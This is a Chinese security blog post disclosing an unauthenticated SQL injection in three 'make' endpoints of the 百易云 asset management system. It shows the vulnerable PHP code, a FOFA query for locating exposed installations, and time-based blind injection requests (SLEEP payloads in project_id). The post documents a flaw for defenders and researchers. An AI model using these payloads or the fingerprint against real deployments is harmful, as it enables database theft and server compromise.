---
title: "百易云资产管理运营系统 make SQL注入漏洞"
source: https://mrxn.net/jswz/baiyishequ-adminx-make-project_id-sqli.html
asset_dir: assets/百易云资产管理运营系统-make-sql注入漏洞
---

# 百易云资产管理运营系统 make SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/7 08:28
- 1111浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

SQL

软件

计算机安全

---

# 漏洞简介

百易云资产管理运营系统，是专门针对企业不动产资产管理和运营需求而设计的一套综合解决方案。该系统能够覆盖资产的全，包括资产的登记、盘点、评估、处置等多个环节，同时提供强大的运营分析功能，帮助企业优化资产配置，提升运营效率。百易云资产管理运营系统 imaRead.make.php、leaseImaRead.make.php、adminx/leaseTurnoverRead.make.php 接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `body="不要着急，点此"`

# 漏洞分析

看下 imaRead.make.php 的业务逻辑实现，其他两个文件也存在类似的代码片段

```
<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
header("Content-type: text/html; charset=utf-8");
require_once ("admin.config.php"); 
require_once ("../service/dict.service.php");
require_once ("../service/imaRead.service.php");
require_once ("../com/util.class.php");
$act = $_GET["act"];
$project_id = $_GET["project_id"];
$ima_type= $_GET["ima_type"];
$fee_month = ($_GET["fee_month"]!="")?$_GET["fee_month"]:date("Y-m",time());
$building_code = $_GET["building_code"];
//$month=strReplace($fee_month,"-","");+

 $dict = new dict();
 $minDays= $dict->getOrgCfgValByKey($project_id,"appcfg_imaReadMinDays","org",0);
$imaRead=new imaRead(); 

 if ($act=="remake") {
          $ireads =  $_POST['feeItem'];
          $ids = arr2str($ireads) ;
          $isImaShare = ($building_code=="imaShare")?1:0 ; 
      $ret=$imaRead->genImaReadBlankByPreRead($ids,$isImaShare ) ;
             wlog( $imaRead->getSql());
            if ($ret<=0) {
                  $errInfo= $imaRead->getErrInfo()  ;
                  $errInfo="操作失败.".$errInfo ;
                } else {
                  $errInfo="生成成功." ;
                } 
 }

//$month=strReplace($fee_month,"-","");
if ($act=="make") {
        if ($project_id!="") {
         $minDays =0 ;//强制
         $isImaShare = ($building_code=="imaShare")?1:0 ; 
         if ($ima_type=="turnover") $isImaShare=2;
                 $ret=$imaRead->genImaMonthReadBlank($project_id,$ima_type,$fee_month,$isImaShare,$minDays);
                 //wlog( $imaRead->getSql());
                 if ($ret<=0) {
                  $errInfo= $imaRead->getErrInfo()  ;
                  $errInfo="操作失败".$errInfo ;
                } else {
                  $errInfo="生成成功." ;
                } 
     }  else 
         $errInfo="项目信息不能为空." ;
}

alertMsg($errInfo); 

?>
```

深入探索

SQL注入检测工具

文件大小转换

漏洞预警服务

`$project_id` 是由用户通过 `$_GET["project_id"]` 直接传入的，未经任何过滤或转义直接拼接了 `$project_id` 到 SQL 查询中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

# 漏洞复现

## imaRead.make.php

```
GET /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

成功延时 6 秒

代码安全审计

[![百易云资产管理运营系统 make SQL注入漏洞](images/img-001-095037ed1b26.webp)](https://image.mrxn.net/58c7a9d6bc3440f88c625ecb4b6bc3d6.webp)

## leaseImaRead.make.php

```
GET /adminx/leaseImaRead.make.php?act=make&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

## leaseTurnoverRead.make.php

```
GET /adminx/leaseTurnoverRead.make.php?project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1
Host: baiyishequ.mrxn.net
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.imaRead.make.php](#toc-5-1-)
- [5.2.leaseImaRead.make.php](#toc-5-2-)
- [5.3.leaseTurnoverRead.make.php](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
